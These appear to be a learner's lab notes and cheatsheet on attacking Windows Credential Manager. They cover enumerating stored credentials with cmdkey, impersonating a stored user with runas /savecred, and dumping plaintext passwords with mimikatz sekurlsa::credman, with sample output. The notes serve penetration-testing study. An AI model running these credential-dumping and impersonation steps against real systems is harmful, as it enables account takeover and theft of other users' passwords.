Credential Manager Server 2008 R2 and Windows 7
# cheatsheet
```cmd-session
C:\Users\sadams>whoami
srv01\sadams

CMD> cmdkey /list
```

run elevated as a stored user:
```
runas /savecred /user:SRV01\mcharles cmd
```

view credentials 
```
C:> rundll32 keymgr.dll,KRShowKeyMg
```
dump credential manager creds with mimikatz
```
mimikatz.exe

mimikatz # privilege::debug
Privilege '20' OK

sekurlsa::credman
```
# Attacking Windows Credential Manager
it allows users and applications to securely store credentials relevant to other systems and websites. Credentials are stored in special encrypted folders on the computer under the user and system profiles
```
- `%UserProfile%\AppData\Local\Microsoft\Vault\`
- `%UserProfile%\AppData\Local\Microsoft\Credentials\`
- `%UserProfile%\AppData\Roaming\Microsoft\Vault\`
- `%ProgramData%\Microsoft\Vault\`
- `%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\`
```


# Credential Guard
further protects the DPAPI master keys by storing them in secured memory enclaves ([Virtualization-based Security](https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs)).

Microsoft often refers to the protected stores as `Credential Lockers` (formerly `Windows Vaults`). Credential Manager is the user-facing feature/API, while the actual encrypted stores are the vault/locker folders. The following table lists the two types of credentials Windows stores:

|Name|Description|
|---|---|
|Web Credentials|Credentials associated with websites and online accounts. This locker is used by Internet Explorer and legacy versions of Microsoft Edge.|
|Windows Credentials|Used to store login tokens for various services such as OneDrive, and credentials related to domain users, local network resources, services, and shared directories.|
![](/images/Pasted image 20250623151709.png)
It is possible to export Windows Vaults to `.crd` files either via Control Panel or with the following command.

created this way are encrypted with a password supplied by the user, and can be imported on other Windows systems.


```cmd-session
C:\Users\sadams>rundll32 keymgr.dll,KRShowKeyMg
```
![](/images/Pasted image 20250623151818.png)
# CMDKEY
Creates, lists, and deletes stored user names and passwords or credentials.
We can use [cmdkey](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey) to enumerate the credentials stored in the current user's profile:
```cmd-session
C:\Users\sadams>whoami
srv01\sadams

C:\Users\sadams>cmdkey /list

Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02hejubrtyqjrkfi
    Local machine persistence

    Target: Domain:interactive=SRV01\mcharles
    Type: Domain Password
    User: SRV01\mcharles
```

| Key         | Value                                                                                                                                                      |
| ----------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Target      | The resource or account name the credential is for. This could be a computer, domain name, or a special identifier.                                        |
| Type        | The kind of credential. Common types are `Generic` for general credentials, and `Domain Password` for domain user logons.                                  |
| User        | The user account associated with the credential.                                                                                                           |
| Persistence | Some credentials indicate whether a credential is saved persistently on the computer; credentials marked with `Local machine persistence` survive reboots. |
|             |                                                                                                                                                            |
The second credential, `Domain:interactive=SRV01\mcharles`, is a domain credential associated with the user SRV01\mcharles. `Interactive` means that the credential is used for interactive logon sessions. Whenever we come across this type of credential, we can use `runas` to impersonate the stored user like so:

```cmd-session
C:\Users\sadams>runas /savecred /user:SRV01\mcharles cmd
```
![](/images/Pasted image 20250623152244.png)

# MimiKatz

There are many different tools that can be used to decrypt stored credentials. One of the tools we can use is [mimikatz](https://github.com/gentilkiwi/mimikatz). Even within `mimikatz`, there are multiple ways to attack these credentials - we can either dump credentials from memory using the `sekurlsa` module, or we can manually decrypt credentials using the `dpapi` module.
## dumping credential manager passwords:
run mimikatz with sekurlsa credential manager option
```
mimikatz.exe

mimikatz # privilege::debug
Privilege '20' OK

sekurlsa::credman

   credman :
         [00000000]
         * Username : mcharles@blackwood.local
         * Domain   : onedrive.live.com
         * Password : Blackwood#2025
```

# OTHER TOOLS TO TRY
**Note:** Some other tools which may be used to enumerate and extract stored credentials included [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI), [LaZagne](https://github.com/AlessandroZ/LaZagne), and [DonPAPI](https://github.com/login-securite/DonPAPI).


# I COULDNT DO THE  EXERCISE

exercise here is weird, we get a shell as mcharles with his saved creds and then we cant view his credentials because of a weird error
that error may be tied to UAC
i did 
some payload to launch shell locally as mcharles
